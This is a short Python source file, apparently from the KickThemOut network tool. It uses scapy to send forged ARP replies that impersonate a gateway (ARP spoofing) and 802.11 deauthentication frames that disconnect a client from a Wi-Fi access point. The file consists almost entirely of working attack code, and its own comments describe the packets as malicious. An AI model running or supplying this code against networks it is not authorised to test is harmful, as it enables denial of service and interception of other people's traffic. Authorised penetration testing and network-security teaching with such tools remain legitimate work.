#!/usr/bin/env python
# -.- coding: utf-8 -.-
# spoof.py
# authors: k4m4 & xdavidhu

"""
Copyright (C) 2016 Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Schütz (xdavid@protonmail.com)
See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
"""

import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp,
    conf,
    RadioTap,
    Dot11,
    Dot11Deauth
)


# send malicious ARP packets
def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
    ether = Ether()
    ether.src = my_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac

    arp = arp
    arp.pdst = target_ip
    arp.hwdst = target_mac

    ether = ether
    ether.src = my_mac
    ether.dst = target_mac

    arp.op = 2

    def broadcastPacket():
        packet = ether / arp
        sendp(x=packet, verbose=False)

    broadcastPacket()


# send malicious ARP packets
def sendDeauthPacket(iface, bssid, client):
    conf.verb = 0
    conf.iface = iface
    
    def broadcastPacket():
        pkt=RadioTap()/Dot11(addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()
        sendp(pkt)

    broadcastPacket()

